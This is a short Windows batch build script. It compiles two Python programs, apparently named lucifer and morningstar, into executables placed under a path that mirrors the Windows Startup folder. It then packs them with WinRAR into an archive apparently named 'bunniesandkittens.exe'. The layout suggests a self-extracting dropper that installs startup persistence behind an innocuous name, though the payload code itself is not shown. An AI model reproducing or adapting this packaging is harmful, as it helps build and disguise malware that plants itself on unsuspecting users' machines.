@ ECHO OFF
ECHO -----Compiling lucifer.exe
python F:\_Lucifer\pyinstaller-develop\pyinstaller.py lucifer.py -F --onefile --distpath="dist/microsoft/windows/start menu/programs/startup" --console
ECHO -----Compiling morningstar.exe
python F:\_Lucifer\pyinstaller-develop\pyinstaller.py morningstar.py -F --onefile --distpath="dist/microsoft/windows/start menu/programs/startup" --console 
ECHO -----Compiling bunniesandkittens.exe
"%ProgramFiles%\WinRAR\WinRAR.exe" "-cplucifer" "dist/*"
ECHO -----Finished
timeout 10
